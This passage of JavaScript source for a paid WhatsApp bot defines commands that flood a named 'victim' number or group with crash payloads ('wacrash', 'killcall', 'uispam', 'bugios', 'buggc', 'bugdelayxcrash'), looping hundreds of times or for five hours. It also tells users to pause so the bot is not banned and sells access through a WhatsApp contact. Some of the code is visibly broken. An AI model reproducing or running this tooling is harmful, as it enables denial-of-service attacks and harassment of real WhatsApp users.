    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  let num = q.replace(/[^0-9]/g, '')
  if (!num) return replygcxeon('Example: .delprem 923001234567')

  delPremium(num)
  replygcxeon(`❌ Premium removed: ${num}`)
}
break

case 'listprem': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  const prems = getPremium()
  if (prems.length < 1)
    return replygcxeon('❌ No premium user found')

  let teks = `⭐ *PREMIUM USER LIST*\n\n`
  prems.forEach((num, i) => {
    teks += `${i + 1}. wa.me/${num}\n`
  })

  replygcxeon(teks)
}
break

case 'addowner': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  let num = q.replace(/[^0-9]/g, '')
  if (!num) return replygcxeon('Example: .addowner 923001234567')

  addOwner(num)
  replygcxeon(`👑 Owner added: ${num}`)
}
break

case 'delowner': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  let num = q.replace(/[^0-9]/g, '')
  if (!num) return replygcxeon('Example: .delowner 923001234567')

  delOwner(num)
  replygcxeon(`❌ Owner removed: ${num}`)
}
break

case 'listowner': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  const owners = getOwner()
  if (owners.length < 1)
    return replygcxeon('❌ No owner found')

  let teks = `👑 *OWNER LIST*\n\n`
  owners.forEach((num, i) => {
    teks += `${i + 1}. wa.me/${num}\n`
  })

  replygcxeon(teks)
}
break

case 'self': {
    if (!isCreator) return replygcxeon('❌ Only Owner Can Use This Command')
    
    global.public = false
    replygcxeon('🔒 Bot is now in *SELF MODE*\n\nOnly owner can use commands.')
}
break

case 'public': {
    if (!isCreator) return replygcxeon('❌ Only Owner Can Use This Command')
    
    global.public = true
    replygcxeon('🌐 Bot is now in *PUBLIC MODE*\n\nEveryone can use commands.')
}
break
	
case '😡':
case 'wacrash': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <1; i++) {
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
await sleep(300);
await crashmsg(Xreturn);
}
}
break


case '💋':      
case 'killcall': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <30; i++) {
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(200);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
}
}
break
case '👻':
case 'uispam': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
const FIVE_HOURS = 5 * 60 * 60 * 1000;
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await callCrash(Xreturn);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed Out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
   //
}
}
 
break

 case 'iosinvisiblenew': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 700; i++) {
     await crashiOs(Xreturn)
     await sleep(300);     
   }
		}
		break


case 'iosinvisible': case 'bugios': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 700; i++) {
     await xiosinv(Xreturn)
     await sleep(300);     
   }
		}
		break

case 'reqpair':
    const freeStorage = os.freemem() / (1024 * 1024);
    const totalStorage = os.totalmem() / (1024 * 1024);
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024);

    if (freeStorage < 300 || freeDiskSpace < 300) {
        return replygcxeon('Slot is full, please try again later.');
    }
if (!q) return replygcxeon(`Example:\n ${prefix + command} 92XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
const countryCode = text.slice(0, 3);
const prefixxx = text.slice(0, 1);
const firstTwoDigits = text.slice(0, 2);
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;

case 'delpair': {
	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 92XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;

case 'listpair': {

if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}
        const pairingPath = './lib2/pairing';

    try {
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`);
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }
        const totalUsers = pairedDevices.length;
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'buggc':
case 'gcgroup':
case 'buggroup':
case 'mixgc': {

   if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 50; i++) {
	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
   	await gcandroid(victim);
    await sleep(500);
	await crashmsg(Xreturn);
    await sleep(500);
    await callCrash(Xreturn);
   	await sleep(500);
    await xiosinv(Xreturn)
    await sleep(500);
    }
    }
break


                case 'groupid': {
    
    
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');
    let groupCode = args[0].split('https://chat.whatsapp.com/')[1];
    groupCode = groupCode.split('?')[0];
    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(groupCode);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case '☠️':  
case 'bugdelayxcrash': {

  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  if (!q)
    return replygcxeon(`Example:\n ${prefix + command} 92XXX`)

  victim = text.split("|")[0]
  const victimNumber = victim.replace(/[^0-9]/g, '')

  const Xreturn = m.mentionedJid[0]
    ? m.mentionedJid[0]
    : m.quoted
    ? m.quoted.sender
    : victimNumber + "@s.whatsapp.net"
if (isBlockedTarget(victimNumber) || isDeveloper(victimNumber))
  return replygcxeon('❌ This number is protected')

  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn)
  if (contactInfo.length === 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <150; i++) {
      await nullForce(Xreturn)
      await (250)
      await ZenoDelayNewBeta(Xreturn);
      await (2000)
     await nullForce(Xreturn);
}
}
break
case "listgc":{

let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
